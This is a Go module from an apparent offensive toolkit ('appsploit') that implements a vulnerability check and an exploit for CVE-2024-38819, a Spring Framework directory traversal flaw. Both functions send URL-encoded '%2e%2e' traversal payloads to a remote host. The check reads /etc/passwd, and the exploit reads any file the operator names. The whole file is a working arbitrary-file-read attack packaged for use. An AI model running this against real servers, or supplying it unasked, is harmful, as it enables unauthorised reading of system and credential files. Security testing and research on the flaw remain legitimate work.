package cve_2024_38819

import (
	"appsploit/cmd/appsploit/flags"
	"appsploit/pkg/utils"
	"strings"

	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"

	"github.com/urfave/cli/v2"
)

var (
	aliases     = []string{"cve_2024_38819"}
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, nil, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, flags.SubCmdFlags)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flags.SubCmdFlags, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "CVE-2024-38819",
		Description: "Spring Framework Directory Traversal - Type: Arbitrary File Read",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.Remote,
			Check:   exeenv.Remote,
			Exploit: exeenv.Remote,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) CheckSec(context *cli.Context) (vulnerabilityExists bool, err error) {
	baseURL := utils.Http.FormatURL(context)
	filename := "/%2e%2e/etc/passwd"
	urlPath := context.String("path")
	if !strings.HasSuffix(urlPath, "/") {
		filename = "%2e%2e/etc/passwd"
	}
	if resp, err := utils.Http.Get(baseURL + urlPath + filename); err != nil {
		return false, err
	} else {
		if strings.Contains(resp, "root:") {
			v.VulnerabilityExists = true
		} else {
			v.VulnerabilityExists = false
		}
	}
	return v.BaseVulnerability.CheckSec(context)
}

func (v *vulnerability) Exploit(context *cli.Context) error {
	baseURL := utils.Http.FormatURL(context)
	filename := context.String("file")
	urlPath := context.String("path")
	if !strings.HasSuffix(urlPath, "/") {
		filename = "%2e%2e" + filename
	} else {
		filename = "/%2e%2e" + filename
	}
	filename = strings.ReplaceAll(filename, "/", "%2f")
	if vulnerabilityExists, err := v.CheckSec(context); err != nil {
		return err
	} else {
		if vulnerabilityExists {
			if resp, err := Exploit(baseURL, urlPath, filename); err != nil {
				return err
			} else {
				v.VulnerabilityResponse = resp
				// 调用基类的输出方法来显示结果
				v.BaseVulnerability.OutputResp()
				return nil
			}
		}
	}
	return nil
}
